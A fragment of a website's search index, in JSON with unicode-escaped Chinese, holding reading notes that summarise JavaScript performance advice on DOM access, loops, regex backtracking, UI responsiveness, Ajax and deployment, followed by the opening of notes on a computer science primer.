\u8bbf\u95ee\u548c\u64cd\u4f5c\u662f\u73b0\u4ee3\u7f51\u9875\u5e94\u7528\u4e2d\u5f88\u91cd\u8981\u7684\u4e00\u90e8\u5206\u3002\u4f46\u6bcf\u6b21\u4f60\u901a\u8fc7\u6865\u6881\u4ece ECMAScript \u5c9b\u5230\u8fbe DOM \u5c9b\u65f6\uff0c\u90fd\u4f1a\u88ab\u6536\u53d6\u201c\u8fc7\u6865\u8d39\u201d\u3002\u4e3a\u51cf\u5c11 DOM \u7f16\u7a0b\u4e2d\u7684\u6027\u80fd\u635f\u5931,\u8bf7\u7262\u8bb0\u4ee5\u4e0b\u51e0\u70b9:</p> <ul> <li>\u6700\u5c0f\u5316 DOM \u8bbf\u95ee,\u5728 JavaScript \u7aef\u505a\u5c3d\u53ef\u80fd\u591a\u7684\u4e8b\u60c5\u3002</li> <li>\u5728\u53cd\u590d\u8bbf\u95ee\u7684\u5730\u65b9\u4f7f\u7528\u5c40\u90e8\u53d8\u91cf\u5b58\u653e DOM \u5f15\u7528\u3002</li> <li>\u5c0f\u5fc3\u5730\u5904\u7406 HTML \u96c6\u5408,\u56e0\u4e3a\u4ed6\u4eec\u8868\u73b0\u51fa\u201c\u5b58\u5728\u6027\u201d,\u603b\u662f\u5bf9\u5e95\u5c42\u6587\u6863\u91cd\u65b0\u67e5\u8be2\u3002</li> <li>\u5c06\u96c6\u5408\u7684 length \u5c5e\u6027\u7f13\u5b58\u5230\u4e00\u4e2a\u53d8\u91cf\u4e2d,\u5728\u8fed\u4ee3\u4e2d\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\u3002\u5982\u679c\u7ecf\u5e38\u64cd\u4f5c\u8fd9\u4e2a\u96c6\u5408,\u53ef\u4ee5\u5c06\u96c6\u5408\u62f7\u8d1d\u5230\u6570\u7ec4\u4e2d\u3002</li> </ul> <p>\u5982\u679c\u53ef\u80fd\u7684\u8bdd,\u4f7f\u7528\u901f\u5ea6\u66f4\u5feb\u7684 API,\u8bf8\u5982 querySelectorAll()\u548c firstElementChild\u3002\u6ce8\u610f\u91cd\u7ed8\u548c\u91cd\u6392\u7248;\u6279\u91cf\u4fee\u6539\u98ce\u683c,\u79bb\u7ebf\u64cd\u4f5c DOM \u6811,\u7f13\u5b58\u5e76\u51cf\u5c11\u5bf9\u5e03\u5c40\u4fe1\u606f\u7684\u8bbf\u95ee\u3002\u52a8\u753b\u4e2d\u4f7f\u7528\u7edd\u5bf9\u5750\u6807,\u4f7f\u7528\u62d6\u653e\u4ee3\u7406\u3002\u4f7f\u7528\u4e8b\u4ef6\u6258\u7ba1\u6280\u672f\u6700\u5c0f\u5316\u4e8b\u4ef6\u53e5\u67c4\u6570\u91cf\u3002</p> <p>\u7b97\u6cd5\u548c\u6d41\u7a0b\u63a7\u5236</p> <p></p> <p></p> <p>\u6b63\u5982\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00,\u4ee3\u7801\u7684\u5199\u6cd5\u548c\u7b97\u6cd5\u9009\u7528\u5f71\u54cd JavaScript \u7684\u8fd0\u884c\u65f6\u95f4\u3002\u4e0e\u5176\u4ed6\u7f16\u7a0b\u8bed\u8a00\u4e0d\u540c\u7684\u662f, JavaScript \u53ef\u7528\u8d44\u6e90\u6709\u9650,\u6240\u4ee5\u4f18\u5316\u6280\u672f\u66f4\u4e3a\u91cd\u8981\u3002</p> <p>for,while,do-while \u5faa\u73af\u7684\u6027\u80fd\u7279\u6027\u76f8\u4f3c,\u8c01\u4e5f\u4e0d\u6bd4\u8c01\u66f4\u5feb\u6216\u66f4\u6162\u3002\u9664\u975e\u4f60\u8981\u8fed\u4ee3\u904d\u5386\u4e00\u4e2a\u5c5e\u6027\u672a\u77e5\u7684\u5bf9\u8c61,\u5426\u5219\u4e0d\u8981\u4f7f\u7528 for-in \u5faa\u73af\u3002\u6539\u5584\u5faa\u73af\u6027\u80fd\u7684\u6700\u597d\u529e\u6cd5\u662f\u51cf\u5c11\u6bcf\u6b21\u8fed\u4ee3\u4e2d\u7684\u8fd0\u7b97\u91cf,\u5e76\u51cf\u5c11\u5faa\u73af\u8fed\u4ee3\u6b21\u6570\u3002</p> <p>\u4e00\u822c\u6765\u8bf4,switch \u603b\u662f\u6bd4 if-else \u66f4\u5feb,\u4f46\u5e76\u4e0d\u603b\u662f\u6700\u597d\u7684\u89e3\u51b3\u65b9\u6cd5\u3002\u5f53\u5224\u65ad\u6761\u4ef6\u8f83\u591a\u65f6,\u67e5\u8868\u6cd5\u6bd4 if-else \u6216\u8005 switch \u66f4\u5feb\u3002</p> <p>\u6d4f\u89c8\u5668\u7684\u8c03\u7528\u6808\u5c3a\u5bf8\u9650\u5236\u4e86\u9012\u5f52\u7b97\u6cd5\u5728 JavaScript \u4e2d\u7684\u5e94\u7528;\u6808\u6ea2\u51fa\u9519\u8bef\u5bfc\u81f4\u5176\u4ed6\u4ee3\u7801\u4e5f\u4e0d\u80fd\u6b63\u5e38\u6267\u884c\u3002\u5982\u679c\u4f60\u9047\u5230\u4e00\u4e2a\u6808\u6ea2\u51fa\u9519\u8bef,\u5c06\u65b9\u6cd5\u4fee\u6539\u4e3a\u4e00\u4e2a\u8fed\u4ee3\u7b97\u6cd5\u6216\u8005\u4f7f\u7528\u5236\u8868\u6cd5\u53ef\u4ee5\u907f\u514d\u91cd\u590d\u5de5\u4f5c\u3002</p> <p>\u8fd0\u884c\u7684\u4ee3\u7801\u603b\u91cf\u8d8a\u5927,\u4f7f\u7528\u8fd9\u4e9b\u7b56\u7565\u6240\u5e26\u6765\u7684\u6027\u80fd\u63d0\u5347\u5c31\u8d8a\u660e\u663e\u3002</p> <p>\u5b57\u7b26\u4e32\u548c\u6b63\u5219\u8868\u8fbe\u5f0f</p> <p></p> <p></p> <p>\u5bc6\u96c6\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u548c\u7c97\u6d45\u5730\u7f16\u5199\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u80fd\u662f\u4e3b\u8981\u6027\u80fd\u969c\u788d\u3002\u5f53\u8fde\u63a5\u6570\u91cf\u5de8\u5927\u6216\u5c3a\u5bf8\u5de8\u5927\u7684\u5b57\u7b26\u4e32\u65f6,\u6570\u7ec4\u8054\u5408\u662f IE7 \u548c\u5b83\u7684\u65e9\u671f\u7248\u672c\u4e0a\u552f\u4e00\u5177\u6709\u5408\u7406\u6027\u80fd\u7684\u65b9\u6cd5\u3002\u5982\u679c\u4f60\u4e0d\u5173\u5fc3 IE7 \u548c\u5b83\u7684\u65e9\u671f\u7248\u672c,\u6570\u7ec4\u8054\u5408\u662f\u8fde\u63a5\u5b57\u7b26\u4e32\u6700\u6162\u7684\u65b9\u6cd5\u4e4b\u4e00\u3002\u4f7f\u7528\u7b80\u5355\u7684+\u548c+=\u53d6\u800c\u4ee3\u4e4b, \u53ef\u907f\u514d(\u4ea7\u751f)\u4e0d\u5fc5\u8981\u7684\u4e2d\u95f4\u5b57\u7b26\u4e32\u3002</p> <p>\u56de\u6eaf\u65e2\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u529f\u80fd\u57fa\u672c\u7684\u7ec4\u6210\u90e8\u5206,\u53c8\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u5f71\u54cd\u6548\u7387\u7684\u5e38\u89c1\u539f\u56e0\u3002\u56de\u6eaf\u5931\u63a7\u53d1\u751f\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u672c\u5e94\u5f88\u5feb\u53d1\u73b0\u5339\u914d\u7684\u5730\u65b9,\u56e0\u4e3a\u67d0\u4e9b\u7279\u6b8a\u7684\u5339\u914d\u5b57\u7b26\u4e32\u52a8\u4f5c,\u5bfc\u81f4\u8fd0\u884c\u7f13\u6162 \u751a\u81f3\u6d4f\u89c8\u5668\u5d29\u6e83\u3002\u907f\u514d\u6b64\u95ee\u9898\u7684\u6280\u672f\u5305\u62ec:\u4f7f\u76f8\u90bb\u5b57\u5143\u4e92\u65a5,\u907f\u514d\u5d4c\u5957\u91cf\u8bcd\u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u76f8\u540c\u90e8\u5206\u591a\u6b21 \u5339\u914d,\u901a\u8fc7\u91cd\u590d\u5229\u7528\u524d\u77bb\u64cd\u4f5c\u7684\u539f\u5b50\u7279\u6027\u53bb\u9664\u4e0d\u5fc5\u8981\u7684\u56de\u6eaf\u3002</p> <p>\u63d0\u9ad8\u6b63\u5219\u8868\u8fbe\u5f0f\u6548\u7387\u7684\u5404\u79cd\u6280\u672f\u624b\u6bb5,\u5e2e\u52a9\u6b63\u5219\u8868\u8fbe\u5f0f\u66f4\u5feb\u5730\u627e\u5230\u5339\u914d,\u4ee5\u53ca\u5728\u975e\u5339\u914d\u4f4d\u7f6e\u4e0a\u82b1\u8d39\u66f4\u5c11 \u65f6\u95f4(\u89c1\u300a\u66f4\u591a\u63d0\u9ad8\u6b63\u5219\u8868\u8fbe\u5f0f\u6548\u7387\u7684\u65b9\u6cd5\u300b)\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u5e76\u4e0d\u603b\u662f\u5b8c\u6210\u5de5\u4f5c\u7684\u6700\u4f73\u5de5\u5177,\u5c24\u5176\u5f53\u4f60\u53ea\u662f\u641c\u7d22\u4e00\u4e2a\u6587\u672c\u5b57\u7b26\u4e32\u65f6\u3002</p> <p>\u867d\u7136\u6709\u5f88\u591a\u65b9\u6cd5\u6765\u4fee\u6574\u4e00\u4e2a\u5b57\u7b26\u4e32,\u4f7f\u7528\u4e24\u4e2a\u7b80\u5355\u7684\u6b63\u5219\u8868\u8fbe\u5f0f(\u4e00\u4e2a\u7528\u4e8e\u53bb\u9664\u5934\u90e8\u7a7a\u683c,\u53e6\u4e00\u4e2a\u7528\u4e8e \u53bb\u9664\u5c3e\u90e8\u7a7a\u683c)\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u6d01\u3001\u8de8\u6d4f\u89c8\u5668\u7684\u65b9\u6cd5,\u9002\u7528\u4e8e\u4e0d\u540c\u5185\u5bb9\u548c\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u3002\u4ece\u5b57\u7b26\u4e32\u672b\u5c3e\u5f00\u59cb\u5faa\u73af\u67e5\u627e\u7b2c\u4e00\u4e2a\u975e\u7a7a\u683c\u5b57\u7b26,\u6216\u8005\u5728\u4e00\u4e2a\u6df7\u5408\u5e94\u7528\u4e2d\u5c06\u6b64\u6280\u672f\u4e0e\u6b63\u5219\u8868\u8fbe\u5f0f\u7ed3\u5408\u8d77\u6765,\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f88\u597d\u7684 \u66ff\u4ee3\u65b9\u6848,\u5b83\u5f88\u5c11\u53d7\u5230\u5b57\u7b26\u4e32\u6574\u4f53\u957f\u5ea6\u7684\u5f71\u54cd\u3002</p> <p>\u5feb\u901f\u54cd\u5e94\u7528\u6237\u754c\u9762</p> <p></p> <p>JavaScript \u548c\u7528\u6237\u754c\u9762\u66f4\u65b0\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u5185\u8fd0\u884c,\u540c\u4e00\u65f6\u523b\u53ea\u6709\u5176\u4e2d\u4e00\u4e2a\u53ef\u4ee5\u8fd0\u884c\u3002\u8fd9\u610f\u5473\u7740\u5f53 JavaScript \u4ee3\u7801\u6b63\u5728\u8fd0\u884c\u65f6,\u7528\u6237\u754c\u9762\u4e0d\u80fd\u54cd\u5e94\u8f93\u5165,\u53cd\u4e4b\u4ea6\u7136\u3002\u6709\u6548\u5730\u7ba1\u7406 UI \u7ebf\u7a0b\u5c31\u662f\u8981\u786e\u4fdd JavaScript \u4e0d\u80fd\u8fd0\u884c \u592a\u957f\u65f6\u95f4,\u4ee5\u514d\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u3002\u6700\u540e,\u8bf7\u7262\u8bb0\u5982\u4e0b\u51e0\u70b9:</p> <ol> <li> <p>JavaScript \u8fd0\u884c\u65f6\u95f4\u4e0d\u5e94\u8be5\u8d85\u8fc7 100 \u6beb\u79d2\u3002\u8fc7\u957f\u7684\u8fd0\u884c\u65f6\u95f4\u5bfc\u81f4 UI \u66f4\u65b0\u51fa\u73b0\u53ef\u5bdf\u89c9\u7684\u5ef6\u8fdf,\u4ece\u800c\u5bf9\u6574\u4f53 \u7528\u6237\u4f53\u9a8c\u4ea7\u751f\u8d1f\u9762\u5f71\u54cd\u3002</p> </li> <li> <p>JavaScript \u8fd0\u884c\u671f\u95f4,\u6d4f\u89c8\u5668\u54cd\u5e94\u7528\u6237\u4ea4\u4e92\u7684\u884c\u4e3a\u5b58\u5728\u5dee\u5f02\u3002\u65e0\u8bba\u5982\u4f55,JavaScript \u957f\u65f6\u95f4\u8fd0\u884c\u5c06\u5bfc\u81f4\u7528 \u6237\u4f53\u9a8c\u6df7\u4e71\u548c\u8131\u8282\u3002</p> </li> <li> <p>\u5b9a\u65f6\u5668\u53ef\u7528\u4e8e\u5b89\u6392\u4ee3\u7801\u63a8\u8fdf\u6267\u884c,\u5b83\u4f7f\u5f97\u4f60\u53ef\u4ee5\u5c06\u957f\u8fd0\u884c\u811a\u672c\u5206\u89e3\u6210\u4e00\u7cfb\u5217\u8f83\u5c0f\u7684\u4efb\u52a1\u3002</p> </li> </ol> <p>\u7f51\u9875\u5de5\u4eba\u7ebf\u7a0b\u662f\u65b0\u5f0f\u6d4f\u89c8\u5668\u624d\u652f\u6301\u7684\u7279\u6027,\u5b83\u5141\u8bb8\u4f60\u5728 UI \u7ebf\u7a0b\u4e4b\u5916\u8fd0\u884c JavaScript \u4ee3\u7801\u800c\u907f\u514d\u9501\u5b9a UI\u3002\u7f51\u9875\u5e94\u7528\u7a0b\u5e8f\u8d8a\u590d\u6742,\u79ef\u6781\u4e3b\u52a8\u5730\u7ba1\u7406 UI \u7ebf\u7a0b\u5c31\u8d8a\u663e\u5f97\u91cd\u8981\u3002\u6ca1\u6709\u4ec0\u4e48 JavaScript \u4ee3\u7801\u53ef\u4ee5\u91cd\u8981\u5230\u5141 \u8bb8\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u7684\u7a0b\u5ea6\u3002</p> <p>Ajax</p> <p></p> <p></p> <p>\u9ad8\u6027\u80fd Ajax \u5305\u62ec:\u77e5\u9053\u4f60\u9879\u76ee\u7684\u5177\u4f53\u9700\u6c42,\u9009\u62e9\u6b63\u786e\u7684\u6570\u636e\u683c\u5f0f\u548c\u4e0e\u4e4b\u76f8\u914d\u7684\u4f20\u8f93\u6280\u672f\u3002</p> <p>\u4f5c\u4e3a\u6570\u636e\u683c\u5f0f,\u7eaf\u6587\u672c\u548c HTML \u662f\u9ad8\u5ea6\u9650\u5236\u7684,\u4f46\u5b83\u4eec\u53ef\u8282\u7701\u5ba2\u6237\u7aef\u7684 CPU \u5468\u671f\u3002XML \u88ab\u5e7f\u6cdb\u5e94\u7528 \u666e\u904d\u652f\u6301,\u4f46\u5b83\u975e\u5e38\u5197\u957f\u4e14\u89e3\u6790\u7f13\u6162\u3002JSON \u662f\u8f7b\u91cf\u7ea7\u7684,\u89e3\u6790\u8fc5\u901f(\u4f5c\u4e3a\u672c\u5730\u4ee3\u7801\u800c\u4e0d\u662f\u5b57\u7b26\u4e32),\u4ea4 \u4e92\u6027\u4e0e XML \u76f8\u5f53\u3002\u5b57\u7b26\u5206\u9694\u7684\u81ea\u5b9a\u4e49\u683c\u5f0f\u975e\u5e38\u8f7b\u91cf,\u5728\u5927\u91cf\u6570\u636e\u96c6\u89e3\u6790\u65f6\u901f\u5ea6\u6700\u5feb,\u4f46\u9700\u8981\u7f16\u5199\u989d\u5916\u7684 \u7a0b\u5e8f\u5728\u670d\u52a1\u5668\u7aef\u6784\u9020\u683c\u5f0f,\u5e76\u5728\u5ba2\u6237\u7aef\u89e3\u6790\u3002</p> <p>\u5f53\u4ece\u9875\u9762\u57df\u8bf7\u6c42\u6570\u636e\u65f6,XHR \u63d0\u4f9b\u6700\u5b8c\u5584\u7684\u63a7\u5236\u548c\u7075\u6d3b\u6027,\u5c3d\u7ba1\u5b83\u5c06\u6240\u6709\u4f20\u5165\u6570\u636e\u89c6\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32, \u8fd9\u6709\u53ef\u80fd\u964d\u4f4e\u89e3\u6790\u901f\u5ea6\u3002\u53e6\u4e00\u65b9\u9762,\u52a8\u6001\u811a\u672c\u6807\u7b7e\u63d2\u5165\u6280\u672f\u5141\u8bb8\u8de8\u57df\u8bf7\u6c42\u548c\u672c\u5730\u8fd0\u884c JavaScript \u548c JSON, \u867d\u7136\u5b83\u7684\u63a5\u53e3\u4e0d\u591f\u5b89\u5168,\u800c\u4e14\u4e0d\u80fd\u8bfb\u53d6\u4fe1\u606f\u5934\u6216\u54cd\u5e94\u62a5\u6587\u4ee3\u7801\u3002\u591a\u90e8\u5206 XHR \u53ef\u51cf\u5c11\u8bf7\u6c42\u7684\u6570\u91cf,\u53ef\u5728\u4e00\u6b21\u54cd\u5e94\u4e2d\u5904\u7406\u4e0d\u540c\u7684\u6587\u4ef6\u7c7b\u578b,\u5c3d\u7ba1\u5b83\u4e0d\u80fd\u7f13\u5b58\u6536\u5230\u7684\u54cd\u5e94\u62a5\u6587\u3002\u5f53\u53d1\u9001\u6570\u636e\u65f6,\u56fe\u50cf\u706f\u6807\u662f\u6700\u7b80\u5355\u548c\u6700 \u6709\u6548\u7684\u65b9\u6cd5\u3002XHR \u4e5f\u53ef\u7528 POST \u65b9\u6cd5\u53d1\u9001\u5927\u91cf\u6570\u636e\u3002</p> <p>\u9664\u8fd9\u4e9b\u683c\u5f0f\u548c\u4f20\u8f93\u6280\u672f\u4e4b\u5916,\u8fd8\u6709\u4e00\u4e9b\u51c6\u5219\u6709\u52a9\u4e8e\u8fdb\u4e00\u6b65\u63d0\u9ad8 Ajax \u7684\u901f\u5ea6:</p> <ol> <li> <p>\u51cf\u5c11\u8bf7\u6c42\u6570\u91cf,\u53ef\u901a\u8fc7 JavaScript \u548c CSS \u6587\u4ef6\u6253\u5305,\u6216\u8005\u4f7f\u7528 MXHR\u3002</p> </li> <li> <p>\u7f29\u77ed\u9875\u9762\u7684\u52a0\u8f7d\u65f6\u95f4,\u5728\u9875\u9762\u5176\u5b83\u5185\u5bb9\u52a0\u8f7d\u4e4b\u540e,\u4f7f\u7528 Ajax \u83b7\u53d6\u5c11\u91cf\u91cd\u8981\u6587\u4ef6\u3002</p> </li> <li> <p>\u786e\u4fdd\u4ee3\u7801\u9519\u8bef\u4e0d\u8981\u76f4\u63a5\u663e\u793a\u7ed9\u7528\u6237,\u5e76\u5728\u670d\u52a1\u5668\u7aef\u5904\u7406\u9519\u8bef\u3002</p> </li> <li> <p>\u5b66\u4f1a\u4f55\u65f6\u4f7f\u7528\u4e00\u4e2a\u5065\u58ee\u7684 Ajax \u5e93,\u4f55\u65f6\u7f16\u5199\u81ea\u5df1\u7684\u5e95\u5c42 Ajax \u4ee3\u7801\u3002</p> </li> </ol> <p>Ajax \u662f\u63d0\u5347\u4f60\u7f51\u7ad9\u6f5c\u5728\u6027\u80fd\u4e4b\u6700\u5927\u7684\u6539\u8fdb\u533a\u57df\u4e4b\u4e00,\u56e0\u4e3a\u5f88\u591a\u7f51\u7ad9\u5927\u91cf\u4f7f\u7528\u5f02\u6b65\u8bf7\u6c42,\u53c8\u56e0\u4e3a\u5b83\u63d0\u4f9b \u4e86\u8bb8\u591a\u4e0d\u76f8\u5173\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u6848,\u8fd9\u4e9b\u95ee\u9898\u8bf8\u5982,\u9700\u8981\u52a0\u8f7d\u592a\u591a\u8d44\u6e90\u3002\u5bf9 XHR \u7684\u521b\u9020\u6027\u5e94\u7528\u662f\u5982\u6b64\u7684\u4e0e\u4f17 \u4e0d\u540c,\u5b83\u4e0d\u662f\u5446\u6ede\u4e0d\u53cb\u597d\u7684\u754c\u9762,\u800c\u662f\u54cd\u5e94\u8fc5\u901f\u4e14\u9ad8\u6548\u7684\u4ee3\u540d\u8bcd;\u5b83\u4e0d\u4f1a\u5f15\u8d77\u7528\u6237\u7684\u618e\u6068,\u8c01\u89c1\u4e86\u5b83\u90fd\u4f1a \u7231\u4e0a\u5b83\u3002</p> <p>\u7f16\u7a0b\u5b9e\u8df5</p> <p></p> <p>JavaScript \u63d0\u51fa\u4e86\u4e00\u4e9b\u72ec\u7279\u7684\u6027\u80fd\u6311\u6218,\u5173\u7cfb\u5230\u4f60\u7ec4\u7ec7\u4ee3\u7801\u7684\u65b9\u6cd5\u3002\u7f51\u9875\u5e94\u7528\u53d8\u5f97\u8d8a\u6765\u8d8a\u9ad8\u7ea7,\u5305\u542b\u7684 JavaScript \u4ee3\u7801\u8d8a\u6765\u8d8a\u591a,\u51fa\u73b0\u4e86\u4e00\u4e9b\u6a21\u5f0f\u548c\u53cd\u6a21\u5f0f\u3002\u8bf7\u7262\u8bb0\u4ee5\u4e0b\u7f16\u7a0b\u7ecf\u9a8c:</p> <ol> <li> <p>\u901a\u8fc7\u907f\u514d\u4f7f\u7528 eval_r()\u548c Function()\u6784\u9020\u5668\u907f\u514d\u4e8c\u6b21\u8bc4\u4f30\u3002\u6b64\u5916,\u7ed9 setTimeout()\u548c setInterval()\u4f20\u9012\u51fd\u6570\u53c2 \u6570\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\u53c2\u6570\u3002</p> </li> <li> <p>\u521b\u5efa\u65b0\u5bf9\u8c61\u548c\u6570\u7ec4\u65f6\u4f7f\u7528\u5bf9\u8c61\u76f4\u63a5\u91cf\u548c\u6570\u7ec4\u76f4\u63a5\u91cf\u3002\u5b83\u4eec\u6bd4\u975e\u76f4\u63a5\u91cf\u5f62\u5f0f\u521b\u5efa\u548c\u521d\u59cb\u5316\u66f4\u5feb\u3002</p> </li> <li> <p>\u907f\u514d\u91cd\u590d\u8fdb\u884c\u76f8\u540c\u5de5\u4f5c\u3002\u5f53\u9700\u8981\u68c0\u6d4b\u6d4f\u89c8\u5668\u65f6,\u4f7f\u7528\u5ef6\u8fdf\u52a0\u8f7d\u6216\u6761\u4ef6\u9884\u52a0\u8f7d\u3002</p> </li> <li> <p>\u5f53\u6267\u884c\u6570\u5b66\u8fdc\u7b97\u65f6,\u8003\u8651\u4f7f\u7528\u4f4d\u64cd\u4f5c,\u5b83\u76f4\u63a5\u5728\u6570\u5b57\u5e95\u5c42\u8fdb\u884c\u64cd\u4f5c\u3002</p> </li> <li> <p>\u539f\u751f\u65b9\u6cd5\u603b\u662f\u6bd4 JavaScript \u5199\u7684\u4e1c\u897f\u8981\u5feb\u3002\u5c3d\u91cf\u4f7f\u7528\u539f\u751f\u65b9\u6cd5\u3002</p> </li> </ol> <p>\u6784\u5efa\u5e76\u90e8\u7f72\u9ad8\u6027\u80fd javascript \u5e94\u7528</p> <p>\u5f00\u53d1\u548c\u90e8\u7f72\u8fc7\u7a0b\u5bf9\u57fa\u4e8e JavaScript \u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ea7\u751f\u5de8\u5927\u5f71\u54cd,\u6700\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4\u5982\u4e0b:</p> <ol> <li> <p>\u5408\u5e76 JavaScript \u6587\u4ef6,\u51cf\u5c11 HTTP \u8bf7\u6c42\u7684\u6570\u91cf</p> </li> <li> <p>\u4f7f\u7528 YUI \u538b\u7f29\u5668\u7d27\u51d1\u5904\u7406 JavaScript \u6587\u4ef6</p> </li> <li> <p>\u4ee5\u538b\u7f29\u5f62\u5f0f\u63d0\u4f9b JavaScript \u6587\u4ef6(gzip \u7f16\u7801)</p> </li> <li> <p>\u901a\u8fc7\u8bbe\u7f6e HTTP \u54cd\u5e94\u62a5\u6587\u5934\u4f7f JavaScript \u6587\u4ef6\u53ef\u7f13\u5b58,\u901a\u8fc7\u5411\u6587\u4ef6\u540d\u9644\u52a0\u65f6\u95f4\u6233\u89e3\u51b3\u7f13\u5b58\u95ee\u9898</p> </li> <li> <p>\u4f7f\u7528\u5185\u5bb9\u4f20\u9012\u7f51\u7edc(CDN)\u63d0\u4f9b JavaScript \u6587\u4ef6,CDN \u4e0d\u4ec5\u53ef\u4ee5\u63d0\u9ad8\u6027\u80fd,\u5b83\u8fd8\u53ef\u4ee5\u4e3a\u4f60\u7ba1\u7406\u538b\u7f29\u548c\u7f13\u5b58</p> </li> </ol> <p>\u6240\u6709\u8fd9\u4e9b\u6b65\u9aa4\u5e94\u5f53\u81ea\u52a8\u5b8c\u6210,\u4e0d\u8bba\u662f\u4f7f\u7528\u516c\u5f00\u7684\u5f00\u53d1\u5de5\u5177\u8bf8\u5982 Apache Ant,\u8fd8\u662f\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u5f00\u53d1\u5de5\u5177 \u4ee5\u5b9e\u73b0\u7279\u5b9a\u9700\u6c42\u3002\u5982\u679c\u4f60\u4f7f\u8fd9\u4e9b\u5f00\u53d1\u5de5\u5177\u4e3a\u4f60\u670d\u52a1,\u4f60\u53ef\u4ee5\u6781\u5927\u6539\u5584\u90a3\u4e9b\u5927\u91cf\u4f7f\u7528 JavaScript \u4ee3\u7801\u7684\u7f51\u9875\u5e94\u7528\u6216\u7f51\u7ad9\u7684\u6027\u80fd\u3002</p> <p>\u5de5\u5177</p> <p>\u5f53\u7f51\u9875\u6216\u5e94\u7528\u7a0b\u5e8f\u53d8\u6162\u65f6,\u5206\u6790\u7f51\u4e0a\u4f20\u6765\u7684\u8d44\u6e90,\u5206\u6790\u811a\u672c\u7684\u8fd0\u884c\u6027\u80fd,\u4f7f\u4f60\u80fd\u591f\u96c6\u4e2d\u7cbe\u529b\u5728\u90a3\u4e9b\u9700\u8981 \u52aa\u529b\u4f18\u5316\u7684\u5730\u65b9\u3002</p> <p>\u4f7f\u7528\u7f51\u7edc\u5206\u6790\u5668\u627e\u51fa\u52a0\u8f7d\u811a\u672c\u548c\u5176\u5b83\u9875\u9762\u8d44\u6e90\u7684\u74f6\u9888\u6240\u5728,\u8fd9\u6709\u52a9\u4e8e\u51b3\u5b9a\u54ea\u4e9b\u811a\u672c\u9700\u8981\u5ef6\u8fdf\u52a0\u8f7d,\u6216\u8005\u8fdb\u884c\u8fdb\u4e00\u6b65\u5206\u6790\u3002\u4f20\u7edf\u7684\u667a\u6167\u544a\u8bc9\u6211\u4eec\u5e94\u5c3d\u91cf\u51cf\u5c11 HTTP \u8bf7\u6c42\u7684\u6570\u91cf,\u5c3d\u91cf\u5ef6\u8fdf\u52a0\u8f7d\u811a\u672c\u4ee5\u4f7f\u9875\u9762\u6e32\u67d3\u901f\u5ea6\u66f4\u5feb,\u5411\u7528\u6237\u63d0\u4f9b\u66f4\u597d\u7684\u6574\u4f53\u4f53\u9a8c\u3002</p> <p>\u4f7f\u7528\u6027\u80fd\u5206\u6790\u5668\u627e\u51fa\u811a\u672c\u8fd0\u884c\u65f6\u901f\u5ea6\u6162\u7684\u90e8\u5206,\u68c0\u67e5\u6bcf\u4e2a\u51fd\u6570\u6240\u82b1\u8d39\u7684\u65f6\u95f4,\u4ee5\u53ca\u51fd\u6570\u88ab\u8c03\u7528\u7684\u6b21\u6570, \u901a\u8fc7\u8c03\u7528\u6808\u81ea\u8eab\u63d0\u4f9b\u7684\u4e00\u4e9b\u7ebf\u7d22\u6765\u627e\u51fa\u54ea\u4e9b\u5730\u65b9\u5e94\u5f53\u52aa\u529b\u4f18\u5316\u3002\u867d\u7136\u82b1\u8d39\u65f6\u95f4\u548c\u8c03\u7528\u6b21\u6570\u901a\u5e38\u662f\u6570\u636e\u4e2d\u6700\u6709\u4ef7\u503c\u7684\u70b9,\u8fd8\u662f\u5e94\u5f53\u4ed4\u7ec6\u5bdf\u770b\u51fd\u6570\u7684\u8c03\u7528\u8fc7\u7a0b,\u53ef\u80fd\u53d1\u73b0\u5176 \u5b83\u4f18\u5316\u65b9\u6cd5\u3002</p> <p>\u8fd9\u4e9b\u5de5\u5177\u5728\u90a3\u4e9b\u73b0\u4ee3\u4ee3\u7801\u6240\u8981\u8fd0\u884c\u7684\u7f16\u7a0b\u73af\u5883\u4e2d\u4e0d\u518d\u795e\u79d8\u3002\u5728\u5f00\u59cb\u4f18\u5316\u5de5\u4f5c\u4e4b\u524d\u4f7f\u7528\u5b83\u4eec,\u786e\u4fdd\u5f00\u53d1\u65f6 \u95f4\u7528\u5728\u89e3\u51b3\u95ee\u9898\u7684\u5200\u5203\u4e0a\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/","title":"\u8ba1\u7b97\u673a\u662f\u600e\u6837\u8dd1\u8d77\u6765\u7684\u2014\u2014\u8bfb\u4e66\u7b14\u8bb0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 35046  \u9605\u8bfb71\u5206\u949f</p> <p>2023\u5e749\u6708\u7b2c\u4e00\u6b21\u9605\u8bfb\uff0c\u8fd9\u672c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u6982\u8bba\u7684\u8da3\u5473\u5165\u95e8\u4e66\uff0c\u4e00\u672c PDF \u7535\u5b50\u4e66\uff0c\u4f5c\u8005\u662f\u65e5\u672c\u77e2\u6cfd\u4e45\u96c4 </p> <p>\u672c\u4e66\u5021\u5bfc\u5728\u8ba1\u7b97\u673a\u8fc5\u901f\u53d1\u5c55\u3001\u6280\u672f\u4e0d\u65ad\u9769\u65b0\u7684\u4eca\u5929\uff0c\u56de\u5f52\u5230\u8ba1\u7b97\u673a\u7684\u57fa\u7840\u77e5 